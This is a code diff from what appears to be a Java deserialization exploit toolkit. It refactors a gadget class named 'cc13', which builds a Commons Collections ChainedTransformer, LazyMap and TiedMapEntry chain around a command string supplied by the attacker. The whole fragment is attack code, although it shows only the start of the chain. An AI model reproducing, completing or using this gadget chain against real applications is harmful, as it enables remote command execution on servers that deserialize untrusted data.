@@ -4,7 +4,7 @@ import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
 import com.qi4l.JYso.gadgets.utils.Reflections;
-import com.qi4l.JYso.gadgets.utils.cc.TransformerUtil;
+
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantFactory;
@@ -20,7 +20,7 @@ import java.util.Map;
 public class cc13 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
-        final Transformer[] transformers = TransformerUtil.makeTransformer(command);
+        final Transformer[] transformers = com.qi4l.JYso.gadgets.utils.Utils.makeTransformer(command);
         Transformer transformerChain = new ChainedTransformer(transformers);
         Map decorate = LazyMap.decorate(new HashMap(), new ConstantFactory(1));
         TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, 1);
